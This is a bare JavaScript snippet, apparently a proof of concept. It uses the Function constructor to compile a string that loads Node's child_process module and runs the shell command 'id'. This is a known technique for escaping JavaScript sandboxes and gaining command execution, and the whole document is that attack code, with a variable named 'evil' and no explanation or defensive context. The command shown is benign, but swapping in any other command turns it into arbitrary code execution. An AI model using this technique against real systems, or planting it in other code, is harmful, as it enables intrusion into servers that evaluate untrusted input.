const F = (function(){}).constructor;
const code = "return process.mainModule.require('child_process').execSync('id').toString()";
const evil = F(code);
console.log(evil());
